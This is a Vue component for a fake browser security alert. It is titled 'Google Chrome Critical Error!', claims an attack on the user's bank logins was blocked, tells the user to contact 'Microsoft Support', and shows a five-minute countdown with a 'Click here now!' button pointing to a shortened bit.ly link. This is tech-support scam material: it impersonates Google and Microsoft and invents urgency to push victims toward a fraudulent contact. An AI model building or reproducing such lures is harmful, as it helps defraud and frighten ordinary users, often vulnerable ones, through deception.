<template>

<div class="flex justify-between items-center mb-3">
            <div class="flex">
                <span class="text-yellow-300 text-xl mr-2">⚠️</span>
                <h2 class="text-xl font-bold text-red-700">Google Chrome Critical Error!</h2>
            </div>

            <p @click="emit('update:modelValue', 1)" class="cursor-pointer">
                <i class="bi bi-x text-xl text-gray-400"></i>
            </p>
        </div>

        <div class="bg-white text-black p-3 rounded-md  text-sm">
            <p>
                Security system has detected the threatening attempt to gain access to your bank logins
                and related data, but this dangerous connection was blocked with Firewall and further
                data
                leak was prevented.
            </p>
            <p class="mt-2">
                We strongly recommend you to perform temporary block of all of your accounts, and take
                some
                necessary security measures.
            </p>
            <p class="mt-2 font-bold">Contact Microsoft Support:</p>
            <span class="countdown font-mono text-2xl text-red-700">
                <span :style="`--value:${hours};`">{{ hours }}</span> :
                <span :style="`--value:${minutes};`">{{ minutes }}</span> :
                <span :style="`--value:${seconds};`">{{ seconds }}</span>
            </span>
            <p class="mt-2">We are waiting for your rapid response to help you.</p>
        </div>

        <a @click.prevent="emit('update:modelValue', 2)" href="https://bit.ly/sdfdsfds"
            class="bg-red-700 hover:bg-red-800 text-white font-bold w-full mt-4 py-2 rounded block text-center">
            Click here now!
        </a>
</template>

<script setup>

import { ref, onMounted } from "vue";

const props = defineProps(['modelValue'])
const emit = defineEmits(['update:modelValue'])

const hours = ref(0); // Set initial hours
const minutes = ref(4); // Set initial minutes
const seconds = ref(59); // Set initial seconds

onMounted(() => {
    const interval = setInterval(() => {
        if (seconds.value > 0) {
            seconds.value--;
        } else {
            if (minutes.value > 0) {
                minutes.value--;
                seconds.value = 59;
            } else if (hours.value > 0) {
                hours.value--;
                minutes.value = 59;
                seconds.value = 59;
            } else {
                clearInterval(interval); // Stop countdown at 00:00:00
            }
        }
    }, 1000);
});

</script>